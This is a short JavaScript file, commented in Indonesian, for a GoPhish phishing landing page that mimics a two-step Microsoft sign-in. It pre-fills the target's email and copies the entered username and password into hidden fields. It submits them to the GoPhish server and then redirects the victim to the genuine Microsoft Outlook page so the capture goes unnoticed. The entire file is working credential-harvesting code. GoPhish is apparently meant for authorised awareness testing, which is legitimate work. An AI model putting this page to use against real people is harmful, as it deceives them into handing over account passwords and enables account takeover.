// URL Pengalihan (Redirect) setelah data ditangkap oleh GoPhish
// Ganti dengan URL Microsoft yang sebenarnya, misal: 'https://www.microsoft.com/en-us/microsoft-365/outlook/email-and-calendar-software-and-apps'
const REDIRECT_URL = "https://www.microsoft.com/en-us/microsoft-365/outlook/email-and-calendar-software-and-apps"; 

// Isi username awal jika GoPhish memberikan variabel {{.Email}}
// Catatan: Ini harus diuji setelah GoPhish me-render template.
const GOPHISH_EMAIL = "{{.Email}}";
if (GOPHISH_EMAIL && GOPHISH_EMAIL !== "{{.Email}}") {
    document.getElementById('input_username').value = GOPHISH_EMAIL;
    document.getElementById('displayed_username').textContent = GOPHISH_EMAIL;
}

// Fungsi untuk menampilkan langkah password
function showPasswordStep() {
    const username = document.getElementById('input_username').value;
    if (username) {
        // 1. Simpan username ke hidden field GoPhish
        document.getElementById('hidden_username').value = username;
        // 2. Tampilkan username yang baru dimasukkan di Langkah 2
        document.getElementById('displayed_username').textContent = username;

        // 3. Tampilkan langkah password, sembunyikan langkah username
        document.getElementById('step_username').style.display = 'none';
        document.getElementById('step_password').style.display = 'block';
        document.getElementById('input_password').focus();
    } else {
        // Jika input kosong, lakukan validasi standar browser
        document.getElementById('input_username').reportValidity(); 
    }
}

// Fungsi untuk kembali ke langkah username
function showUsernameStep() {
    document.getElementById('step_password').style.display = 'none';
    document.getElementById('step_username').style.display = 'block';
    document.getElementById('input_username').focus();
}

// Tangani pengiriman formulir GoPhish (terjadi saat tombol "Sign in" ditekan)
document.getElementById('gophish_form').onsubmit = function(event) {
    event.preventDefault(); // Mencegah pengiriman formulir standar segera

    const password = document.getElementById('input_password').value;
    
    // 1. Simpan password ke hidden field GoPhish
    document.getElementById('hidden_password').value = password;

    // 2. Kirim data ke GoPhish
    const form = this;
    // Hapus preventDefault dan kirim form
    form.removeEventListener('submit', arguments.callee);
    form.submit();
    
    // 3. Alihkan pengguna setelah jeda singkat (untuk memberi waktu GoPhish menangkap data)
    setTimeout(function() {
        window.location.href = REDIRECT_URL;
    }, 300); // Jeda 300ms
    
    return false; // Mencegah form submit ganda
};
